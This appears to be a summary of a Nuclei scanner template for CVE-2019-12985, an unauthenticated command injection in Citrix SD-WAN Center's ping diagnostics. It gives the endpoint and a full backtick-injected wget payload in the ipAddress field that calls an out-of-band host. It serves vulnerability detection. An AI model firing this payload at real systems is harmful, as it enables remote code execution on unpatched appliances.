---
cve_id: CVE-2019-12985
template_path: nuclei-templates/http/cves/2019/CVE-2019-12985.yaml
affected_product: Citrix SD-WAN Center
severity: critical
authentication: none
external_callback: true
affected_versions: unknown
preconditions: []
poc_classification: rce
---

## Vulnerability
Citrix SD-WAN Center is susceptible to remote command injection via the ping function in DiagnosticsController. The controller fails to validate or sanitize HTTP request parameters (ipAddress, pingCount, packetSize) when constructing shell commands. An unauthenticated attacker can route traffic through the Collector controller and supply crafted parameter values to execute arbitrary OS commands, leading to data exfiltration, unauthorized data modification, and full infrastructure compromise.

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). CWE-78.

## PoC / Detection
Classification: rce

The template first issues GET /login and matches for the string "<title>Citrix SD-WAN</title>" in the response body to fingerprint the product. It then sends POST /Collector/diagnostics/ping with the form-encoded payload `ipAddress=%60/bin/wget+http://{{interactsh-url}}%60` (backtick command substitution to trigger wget). Success is confirmed by an out-of-band HTTP interaction callback to the interactsh server.

## References
- https://www.tenable.com/security/research/tra-2019-31
- https://support.citrix.com/article/CTX251987
- https://nvd.nist.gov/vuln/detail/CVE-2019-12985
